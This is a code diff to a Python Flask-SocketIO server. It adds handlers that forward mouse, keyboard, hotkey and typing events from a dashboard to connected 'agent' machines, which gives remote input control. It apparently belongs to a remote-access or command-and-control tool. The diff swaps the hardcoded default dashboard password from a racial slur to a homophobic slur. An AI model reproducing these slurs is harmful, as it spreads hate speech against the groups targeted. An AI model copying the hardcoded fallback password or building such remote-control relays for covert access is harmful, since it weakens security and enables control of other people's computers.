@@ -15,7 +15,7 @@ socketio = SocketIO(
 )
 
 # ── Dashboard password ────────────────────────────────────────
-DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'youarenigger')
+DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'youarefaggot')
 authed_sids = set()
 
 clients    = {}
@@ -184,6 +184,62 @@ def handle_mouse_click(data):
     cid = data.get('client_id')
     if cid and cid in agent_sids:
         socketio.emit('mouse_click', data, to=agent_sids[cid])
+
+@socketio.on('mouse_down')
+def handle_mouse_down(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('mouse_down', data, to=agent_sids[cid])
+
+@socketio.on('mouse_up')
+def handle_mouse_up(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('mouse_up', data, to=agent_sids[cid])
+
+@socketio.on('mouse_dblclick')
+def handle_mouse_dblclick(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('mouse_dblclick', data, to=agent_sids[cid])
+
+@socketio.on('mouse_scroll')
+def handle_mouse_scroll(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('mouse_scroll', data, to=agent_sids[cid])
+
+@socketio.on('rdp_key_down')
+def handle_rdp_key_down(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('rdp_key_down', data, to=agent_sids[cid])
+
+@socketio.on('rdp_key_up')
+def handle_rdp_key_up(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('rdp_key_up', data, to=agent_sids[cid])
+
+@socketio.on('rdp_hotkey')
+def handle_rdp_hotkey(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('rdp_hotkey', data, to=agent_sids[cid])
+
+@socketio.on('rdp_type')
+def handle_rdp_type(data):
+    if not _check_auth(): return
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('rdp_type', data, to=agent_sids[cid])
 
 @socketio.on('key_press')
 def handle_key_press(data):
